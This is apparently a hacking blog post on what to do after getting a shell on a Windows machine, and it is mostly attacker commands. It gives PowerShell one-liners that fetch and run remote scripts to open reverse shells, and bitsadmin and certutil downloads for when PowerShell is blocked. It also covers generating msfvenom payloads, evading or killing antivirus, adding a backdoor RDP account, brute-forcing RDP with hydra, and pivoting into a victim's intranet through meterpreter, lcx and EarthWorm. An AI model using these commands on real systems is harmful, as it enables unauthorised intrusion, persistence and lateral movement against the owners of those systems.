---
title: After Getting The Shell
date: 2018-11-02 11:55:13
categories: Hacking
tags: [PowerShell, Metasploit]
description: It seems that it's getting more and more popular that everyone would like to scan the whole intranet when he takes down one of the other people's machines. So what to do next after getting the shell of a windows system? Some ideas about that. 
---

Here give two methods to trigger a windows reverse shell with PowerShell, remember to bypass the PowerShell security policy before you execute PowerShell command. (https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/)

For attacker:
```shell
nc -lvp 6666
```

For target:
```shell
powershell IEX (New-Object System.Net.Webclient).DownloadString('http://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1');
powercat -c x.x.x.x -p 6666 -e cmd
```
```shell
powershell IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/samratashok/nishang/9a3c747bcf535ef82dc4c5c66aac36db47c2afde/Shells/Invoke-PowerShellTcp.ps1');
Invoke-PowerShellTcp -Reverse -IPAddress x.x.x.x -port 6666
```

Sometimes the protection system on the server will block PowerShell from downloading anything, there are two tools to help you:
```shell
bitsadmin /transfer myDownloadJob /download /priority normal http://downloadsrv/10mb.zip c:\10mb.zip
```
```shell
certutil -urlcache -split -f "https://download.sysinternals.com/files/PSTools.zip" pstools.zip
```

Most of the time you will face three situations:

### You don't have administrator privilege, but there is no protection system.
If you're lucky enough, there's no anti-virus software in the system, you can trigger a reverse Metasploit shell in any method you like:
In an easy way:

```shell
msfvenom -p windows/meterpreter/reverse_tcp LHOST=x.x.x.x LPORT=4444 -f exe > a.exe
```
All you need to do is uploading the payload and execute it. When it comes to the question of how to upload the payload, the answer is that you must forward your local port to the public network with the help of FRP(https://github.com/fatedier/frp) which is a powerful tool, and you must have a VPS to achieve that. Even if you don't have a VPS, you can use ngrok to make it work.

### There is protection system in the server, but you have administrator privilege.
If you're not so lucky, maybe you should find some methods such as veil-evasion to obfuscate your payload. In worse situation, your payload which has been obfuscated was deleted by the antivirus as well. you'd better consider killing the process of the antivirus.

Sometimes it's not easy to kill the process of antivirus, you can just log into the system by the remote desktop protocol. The first step is to add a new user to the system:

```shell
net user Name Pass /add
```
Then you should add this user to the allowed rdp accounts from the commandline:

```shell
net localgroup "Remote Desktop Users" domain\user /add
```

If you want to add a non-domain user, it's easier:

```shell
net localgroup "Remote Desktop Users" user /add
```
But you cannot do crazy things with this account, but you can identify which protection system the server use and shutdown it or bypass it. It's not done yet if you want to execute some high-privilege command, privilege escalation could be taken into consideration.

Hydra is a powerful tool if you have a powerful wordlist:
```shell
hydra x.x.x.x rdp -L users.txt -P wordlist.txt -v
```
Mimikatz is also a good choice to dump the username and password from memory of the server. But most of the time mimikatz will be killed by the protection system.

### You don't have the administrator privilege, and the server has a protection system.

Shutdown your computer and go to sleep. Don't think about it.

-----------------------

But if I have the whole control of the server, here comes the point, how to scan the whole intranet witch your victim machine's in?

You can just use the socks5 module in meterpreter:

```shell
use anxiliary/server/socks5
set srvhost 127.0.0.1
set srvport 1080
```
Finally, just run:
```shell
run
```
If it's Linux in your local machine, you can use proxychains to set the socks5 proxy.
Getting proxychains installed:
```shell
apt install proxychains-ng
```
Add the following content in the /etc/proxychains.conf file:
```shell
socks5 127.0.0.1 1080
```
Then you can use socks proxy to scan the victim's intranet:
```shell
proxychains4 nmap -sT -Pn -open 192.168.100.1/22
```
The command above is from the Internet and I'm so confused about it. I have tried so many times to find out all the machines in the victim's intranet but I was always failed. I'm figuring out the proposal for this problem.

You can also use the msf built-in module to scan:
```shell
auxiliary/scanner/portscan
scanner/portscan/syn
scanner/portscan/tcp
```
If you need ports forwarding, it's also available in meterpreter:
```shell
meterpreter> portfwd add -l 55555 -r 192.168.1.1 -p 3306
```
Another popular tool is lcx.exe:
For attacker:
```shell
lcx -listen 2222 3333
```
For target:
```shell
lcx -slave x.x.x.x 2222 127.0.0.1 3389
```

Or you can use EarthWorm(http://rootkiter.com/EarthWorm/) to forward the victim machine's port to your VPS and use proxychains or proxifier in your local machine:
For your VPS:
```shell
./ew -s rcsocks -l 1080 -e 1024 
```
The command above means your VPS listens the port 1080, 1024  and waits for attacker connect to the port 1080, the victim connects to the port 1024.

For target:
```shell
ew.exe -s rssocks -d x.x.x.x -e 1024
```
The argument -d is the IP address of your VPS.

Finally, the attacker can access services in the intranet by setting socks5 proxy in his browser or use proxychains.




